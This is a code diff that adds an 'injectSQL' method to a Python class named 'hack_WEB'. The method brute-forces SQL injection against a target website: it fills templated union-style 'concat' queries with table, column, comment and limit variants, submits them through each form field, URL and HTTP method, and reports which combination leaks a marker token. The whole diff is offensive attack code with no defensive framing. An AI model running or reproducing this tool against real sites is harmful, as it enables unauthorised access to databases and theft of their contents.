@@ -41,3 +41,57 @@ class hack_WEB(App):
         except:
             pass
         return OBJ
+        
+    # RESUME ABOUT WEBSITE
+    def injectSQL(self, OBJ):
+        jOBJ = self.getJSON(self.obj['dir_querypiece'])
+        queries = self.getJSON(self.obj['dir_queryinject'])
+        sys.stdout.write('\n>>> Looking for the vulnerability of the webpage..')
+        sys.stdout.write('\nLoading: ')
+        for q in range(0, len(queries)):
+            for fulltable in self.joinDBTB( jOBJ ):
+                for column in jOBJ['column']:
+                    for comment in jOBJ['comment']:
+                        for sep in jOBJ['sep']:
+                            for limit in jOBJ['limit']: 
+                                cat = ''
+                                for _ in range(0, jOBJ['max_column']):
+                                    columns = 'concat('+ self.parseCHAR(self.TOKEN, self.sql_sep) +')' + cat
+                                    sidecolumn = cat
+                                    query = queries[q]
+                                    query = re.sub(r'(<%COLUMN%>)', columns, query)
+                                    query = re.sub(r'(<%TABLE%>)', fulltable, query)
+                                    LIMIT = limit.replace('<%X%>', '0').replace('<%Y%>', '1')
+                                    query = re.sub(r'(<%LIMIT%>)', LIMIT, query)
+                                    query = re.sub(r'(<%COMMENT%>)', comment, query)
+                                    cat += sep + column
+                                    obj = {}
+
+                                    for attr in OBJ['name']:
+                                        obj.update({ attr : query })
+
+                                    for url in OBJ['url']:
+                                        serverurl = self.joinURL(self.main_url, url)
+                                        for m in range(0, len(OBJ['method'])):
+                                            rp = self.sendRequest(serverurl, obj, OBJ['method'][m])
+                                            rp = self.TOKEN in rp
+                                            sys.stdout.write('.')
+                                            sys.stdout.flush()
+                                            if rp :
+                                                sys.stdout.flush()
+                                                sys.stdout.write(' done!\n')
+                                                return {
+                                                    "sql" : {
+                                                        "sidecolumn" : sidecolumn,
+                                                        "serverurl" : serverurl,
+                                                        "limit" : limit,
+                                                        "sep" : sep,
+                                                        "comment" : comment,
+                                                        "sqlinjectpos" : q,
+                                                        "field" : OBJ['name'],
+                                                        "method" : OBJ['method'][m]
+                                                    },
+                                                    "obj": self.obj
+                                                }
+        sys.stdout.write("\nOur algorithm cannot detect failures on this website!\b\n")
+        return {}
